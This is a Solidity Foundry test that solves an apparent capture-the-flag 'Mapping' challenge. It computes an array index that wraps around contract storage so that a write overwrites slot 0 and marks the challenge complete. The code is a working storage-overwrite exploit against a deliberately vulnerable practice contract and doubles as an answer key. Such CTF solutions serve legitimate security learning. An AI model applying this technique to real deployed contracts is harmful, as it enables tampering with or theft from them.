// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

interface IMappingChallenge {
    function isComplete() external returns (bool);

    function set(uint256 key, uint256 value) external;

    function get(uint256 key) external view returns (uint256);
}

contract TestMappingChallenge is Test {
    IMappingChallenge challenge;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    function setUp() external {
        vm.prank(deployer);

        //Due to incompatible solidity versions (0.4 v/s 0.8), we are directly deploying the
        //compiled bytecode on blockchain on behalf of deployer using "deployCode"
        address challengeAddress = deployCode(
            "MappingChallenge.sol:MappingChallenge"
        );
        challenge = IMappingChallenge(challengeAddress);
    }

    function test_Solution() external {
        uint256 startingSlot = uint256(keccak256(abi.encode(1)));

        uint256 attackSlot = type(uint256).max - startingSlot + 1;

        vm.prank(player);

        challenge.set(attackSlot, 1);

        assert(challenge.isComplete());
    }
}
